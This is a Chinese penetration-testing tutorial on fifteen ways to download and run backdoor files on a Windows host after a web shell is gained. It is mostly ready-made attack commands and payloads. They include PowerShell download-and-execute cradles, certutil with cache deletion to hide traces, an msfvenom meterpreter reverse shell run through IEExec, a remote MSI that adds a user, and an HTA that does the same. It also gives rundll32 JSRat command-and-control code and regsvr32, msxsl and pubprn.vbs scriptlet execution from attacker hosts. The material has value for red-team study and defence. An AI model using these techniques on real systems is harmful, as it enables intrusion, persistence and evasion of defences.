当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？

一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；**第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式****。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。

**在这里，****本文收集了15种常见的文件下载执行的方式，并结合具体案例**，让我们一起来看看是怎么实现的吧。

------

- PowerShell
- Bitsadmin
- certutil
- wget
- ipc$文件共享
- FTP
- TFTP
- WinScp
- msiexec
- IEExec
- mshta
- rundll32
- regsvr32 
- MSXSL.EXE
- pubprn.vbs

------

**1、PowerShell**

PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。

远程下载文件保存在本地：

~~~
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe')
~~~

远程执行命令：

~~~
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
~~~

![](./image/20200413-1.png)



**2、Bitsadmin**

bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。

~~~
bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
~~~

输入以上命令，成功下载文件。

![](./image/20200413-2.png)



**3、certutil**

用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。

注：缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"

~~~
#下载文件
certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
#删除缓存
certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
~~~

![](./image/20200413-3.png)

**4、wget**

Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。

wget.exe下载：<https://eternallybored.org/misc/wget/>

```
wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
```

![](./image/20200413-4.png)



**5、ipc$文件共享**

IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

~~~
#建立远程IPC连接
net use \\192.168.28.128\ipc$ /user:administrator "abc123!"
#复制远程文件到本地主机
copy \\192.168.28.128\c$\2.txt D:\test
~~~

![](./image/20200413-5.png)



**6、FTP **

一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。

```
ftp 127.0.0.1
username
password
get file
exit
```

![](./image/20200413-6.png)



**7、TFTP**

用来下载远程文件的最简单的网络协议，它基于UDP协议而实现

tftp32服务端下载地址：<http://tftpd32.jounin.net/tftpd32_download.html>

```
tftp -i 你的IP get 要下载文件 存放位置
```

![](./image/20200413-7.png)

**8、WinScp**

WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。

```
#上传
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "put D:\1.txt  /tmp/" "exit" /log=log_file.txt 

#下载
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "get /tmp D:\test\app\" "exit" /log=log_file.tx
```

使用winscp.exe 作为命令行参数执行远程上传/下载操作。

![](./image/20200413-8.png)



**9、msiexec**

msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：

~~~
#生成msi包
msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi
#远程执行
msiexec /q /i http://192.168.28.128/evil.msi
~~~

成功添加了一个test用户：

![](./image/20200413-9.png)



**10、IEExec**

IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。

生成Payload：

~~~
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
~~~

使用管理员身份打开cmd，分别运行下面两条命令。

~~~
C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off
C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe
~~~

![](./image/20200413-10.png)



**11、mshta**

mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。

~~~
mshta http://192.168.28.128/run.hta
~~~

run.hta内容如下：

~~~
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe /c net user test password /add" // 这里填写命令
self.close
</script>
<body>
demo
</body>
</HEAD> 
</HTML>
~~~

![](./image/20200413-11.png)



**12、rundll32**

其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。

项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git

步骤一：开始运行JSRat，监听本地8888端口。

![](./image/20200413-12-1.png)

步骤二：通过url访问，可以查看恶意代码。

![](.\image\20200413-12-2.png)

复制代码如下：

~~~
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
~~~

步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：

![](./image/20200413-12-3.png)



**13、regsvr32 **

Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行

在目标机上执行：

~~~
regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
~~~

可以通过自己构造.sct文件，去下载执行我们的程序

~~~
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="ShortJSRAT"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            ps  = "cmd.exe /c calc.exe";
            new ActiveXObject("WScript.Shell").Run(ps,0,true);
        ]]>
</script>
</registration>
</scriptlet>
~~~

执行命令，成功弹计算器：

![](./image/20200413-13.png)



**14、MSXSL.EXE**

msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。

下载地址为：<https://www.microsoft.com/en-us/download/details.aspx?id=21714>

msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：

```
msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
```

demo.xml

```
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
<customers>
<customer>
<name>Microsoft</name>
</customer>
</customers>
```

exec.xsl

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
  
<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
   return nodelist.nextNode().xml;
  
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```



![](./image/20200413-14.png)



**15、pubprn.vbs**

在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()

```
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

test.sct

```
<?XML version="1.0"?>
<scriptlet>
<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>
</registration>
<script language="JScript">
<![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```

![](./image/20200413-15.png)


